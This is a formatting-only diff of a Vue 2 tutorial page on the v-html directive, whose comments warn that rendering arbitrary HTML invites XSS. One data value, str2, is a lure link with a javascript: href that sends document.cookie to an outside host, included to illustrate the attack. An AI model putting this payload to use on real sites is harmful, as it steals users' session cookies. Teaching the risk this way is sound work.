@@ -1,13 +1,13 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <meta charset="UTF-8"/>
-    <title>v-html指令</title>
-    <!-- 引入Vue -->
-    <script type="text/javascript" src="../js/vue.js"></script>
-</head>
-<body>
-<!--
+    <head>
+        <meta charset="UTF-8" />
+        <title>v-html指令</title>
+        <!-- 引入Vue -->
+        <script type="text/javascript" src="../js/vue.js"></script>
+    </head>
+    <body>
+        <!--
         v-html 指令：
         	1、作用：向指定节点中渲染包含 html 结构的内容。
         	2、与插值语法的区别：
@@ -17,24 +17,24 @@
         	           (1) 在网站上动态渲染任意 HTML 是非常危险的，容易导致 XSS 攻击。
         	           XSS 科普：https://www.bilibili.com/video/BV1s5411s7qd?share_source=copy_web&vd_source=f142a37c45de7b8323eedf220d9dcdd1
         	           (2) 一定要在可信的内容上使用 v-html，永不要用在用户提交的内容上使用！
--->
-<div id="root">
-    <div>你好，{{name}}</div>
-    <div v-html="str"></div>
-    <div v-html="str2"></div>
-</div>
-</body>
+         -->
+        <div id="root">
+            <div>你好，{{name}}</div>
+            <div v-html="str"></div>
+            <div v-html="str2"></div>
+        </div>
+    </body>
 
-<script type="text/javascript">
-    Vue.config.productionTip = false;
+    <script type="text/javascript">
+        Vue.config.productionTip = false;
 
-    new Vue({
-        el: '#root',
-        data: {
-            name: '尚硅谷',
-            str: '<h3>你好啊！</h3>',
-            str2: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
-        }
-    })
-</script>
+        new Vue({
+            el: '#root',
+            data: {
+                name: '尚硅谷',
+                str: '<h3>你好啊！</h3>',
+                str2: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>'
+            }
+        });
+    </script>
 </html>
